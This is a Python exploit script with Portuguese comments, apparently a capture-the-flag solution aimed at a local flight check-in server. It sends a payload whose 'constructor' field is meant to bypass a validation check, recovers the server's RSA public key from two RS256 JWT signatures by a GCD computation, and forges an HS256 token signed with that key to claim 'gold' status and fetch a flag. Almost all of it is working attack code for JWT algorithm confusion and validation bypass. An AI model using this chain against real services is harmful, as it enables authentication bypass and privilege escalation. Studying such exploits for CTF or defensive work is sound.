import requests
import json
import base64
import hmac
import hashlib
from base64 import urlsafe_b64decode
from Crypto.Util.number import bytes_to_long
from Crypto.PublicKey import RSA
import gmpy2
from hashlib import sha256

# CRIAR CHAVES RSA
# openssl genrsa -out private.pem 2048
# openssl rsa -in private.pem -pubout -out public.pem

# -----------------------------
# Configurações do servidor
# -----------------------------
URL_BASE = "http://localhost:3000"

# -----------------------------
# Função para obter tokens do servidor
# -----------------------------
def get_token(i):
    """
    Envia um POST para /checkin com payload manipulando a vulnerabilidade JPV
    e retorna o token JWT gerado pelo servidor.
    """
    payload = {
        "firstName": "John",
        "lastName": "Madden",
        "passport": 123456789,
        "ffp": f"CA1234567{i}",
        "extras": {
            "sssr": {"sssr": "FQTU"},  # valor que normalmente não passaria na validação
            "constructor": {"name": "Array"}  # Bypass da verificação JPV
        }
    }

    res = requests.post(f"{URL_BASE}/checkin", json=payload).json()
    return res["token"]

# -----------------------------
# Função PKCS1 v1.5 encode
# -----------------------------
def pkcs1_v1_5_encode(msg: bytes, n_len: int) -> bytes:
    """
    Aplica o padding PKCS1 v1.5 no digest SHA256 de uma mensagem.
    msg: bytes da mensagem (header.payload)
    n_len: tamanho em bytes do módulo N da chave RSA
    """
    SHA256_Digest_Info = b'\x30\x31\x30\x0D\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
    digest = sha256(msg).digest()
    T = SHA256_Digest_Info + digest
    PS = b'\xFF' * (n_len - len(T) - 3)
    return b'\x00\x01' + PS + b'\x00' + T

# -----------------------------
# Função para calcular "magic" e tentar recuperar N
# -----------------------------
def get_magic(jwt_token: str, e: int) -> gmpy2.mpz:
    """
    Calcula o valor sig**e - pt para um JWT assinado com RS256.
    """
    header, payload, signature = jwt_token.split(".")
    raw_signature = urlsafe_b64decode(f"{signature}==")
    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature))

    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature))
    padded_int = gmpy2.mpz(bytes_to_long(padded_msg))

    return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)

# -----------------------------
# Recuperando dois tokens do servidor
# -----------------------------
token1 = get_token(0)
token2 = get_token(1)
print("\nToken 1:", token1)
print("\nToken 2:", token2)

# -----------------------------
# Tentativa de encontrar e e N
# -----------------------------
possible_e = [3, 17, 65537]
for e_candidate in possible_e:
    magic0 = get_magic(token1, e_candidate)
    magic1 = get_magic(token2, e_candidate)
    N = gmpy2.gcd(magic0, magic1) #gcd(k0 * n   k1 * n) = n
    if N != 1:
        print(f"\n[+] Chave pública encontrada com e = {e_candidate}")
        print(f"\nN (hex): {hex(N)}")
        e = e_candidate
        break

# -----------------------------
# Construindo a chave pública RSA
# -----------------------------
pubkey = RSA.construct((int(N), int(e)))
pem_rsa = pubkey.export_key()
print("\nChave pública PEM:")
print(pem_rsa)

# -----------------------------
# Gerando JWT HS256 manualmente usando a PEM RSA pública
# -----------------------------
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header_hs = {"alg": "HS256", "typ": "JWT"}
payload_hs = {"status": "gold"}

header_b64 = b64url_encode(json.dumps(header_hs).encode())
payload_b64 = b64url_encode(json.dumps(payload_hs).encode())
message = f"{header_b64}.{payload_b64}"

signature = hmac.new(pem_rsa, message.encode(), hashlib.sha256).digest()
signature_b64 = b64url_encode(signature)

jwt_hs_token = f"{message}.{signature_b64}"
print("\nToken JWT HS256:")
print(jwt_hs_token)

# -----------------------------
# Enviando o token para o endpoint /upgrades/flag
# -----------------------------
headers = {"Authorization": f"Bearer {jwt_hs_token}"}
res = requests.post(f"{URL_BASE}/upgrades/flag", headers=headers).json()
print("\nResposta do servidor:")
print(res)
